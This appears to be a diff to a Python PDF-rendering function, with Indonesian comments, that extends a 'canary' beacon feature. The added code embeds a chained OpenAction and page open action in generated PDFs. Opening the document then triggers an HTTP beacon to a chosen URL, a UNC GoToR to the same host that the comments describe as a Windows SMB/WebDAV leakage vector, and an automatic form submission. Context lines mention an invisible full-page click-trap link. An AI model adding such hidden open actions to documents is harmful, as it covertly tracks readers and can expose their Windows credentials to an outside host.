@@ -140,11 +140,33 @@ def render_pdf(
                 x += shifts[li][wi]
 
     if beacon_url:
-        # Lapis A (Zero-Click): Sisipkan OpenAction pada Catalog dan Page AA untuk Adobe Acrobat Reader
+        # Ekstrak host dari beacon_url untuk jalur UNC (vektor Windows SMB / WebDAV)
+        host = "localhost"
+        try:
+            from urllib.parse import urlparse
+            parsed = urlparse(beacon_url)
+            host = parsed.hostname or "localhost"
+        except Exception:
+            pass
+
+        unc_target = rf"\\\\{host}\\beacon\\canary.pdf"
+
+        # Lapis A Multi-Vektor Zero-Click (ISO 32000 Chained Actions):
+        # 1. /S /URI (Standar Web HTTP Beacon)
+        # 2. /S /GoToR (Windows UNC Path SMB/WebDAV Leakage ke kernel Windows)
+        # 3. /S /SubmitForm (AcroForm Data Submission otomatis saat dokumen dimuat)
+        action_chain = (
+            f"<< /S /URI /URI ({beacon_url}) "
+            f"/Next [ "
+            f"<< /S /GoToR /F ({unc_target}) /D [ 0 /Fit ] >> "
+            f"<< /S /SubmitForm /F << /FS /URL /F ({beacon_url}) >> /Flags 4 >> "
+            f"] >>"
+        )
+
         cat_xref = doc.pdf_catalog()
-        doc.xref_set_key(cat_xref, "OpenAction", f"<< /S /URI /URI ({beacon_url}) >>")
+        doc.xref_set_key(cat_xref, "OpenAction", action_chain)
         page_xref = page.xref
-        doc.xref_set_key(page_xref, "AA", f"<< /O << /S /URI /URI ({beacon_url}) >> >>")
+        doc.xref_set_key(page_xref, "AA", f"<< /O {action_chain} >>")
 
         # Lapis B (Full-Page Invisible Click-Trap): Tautan transparan satu halaman penuh
         # Menjamin pembaca modern (WPS Office, Chrome, Edge) yang memblokir OpenAction
